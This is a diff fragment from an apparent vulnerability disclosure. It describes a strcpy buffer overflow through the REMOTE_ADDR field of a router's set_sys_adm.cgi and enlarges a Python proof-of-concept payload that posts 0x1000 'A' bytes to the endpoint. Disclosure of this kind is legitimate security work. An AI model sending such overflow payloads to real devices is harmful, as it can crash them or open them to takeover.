@@ -24,7 +24,7 @@ get value from REMOTE_ADDR ,and call strcpy, cause buff overflow
 ## POC
 ```
 url = "http://192.168.0.1/cgi-bin/set_sys_adm.cgi"
-payload = 'A'*300 + '\n'
+payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={ 'page=sysAdm&REMOTE_ADDR=' + payload})
 ``` 
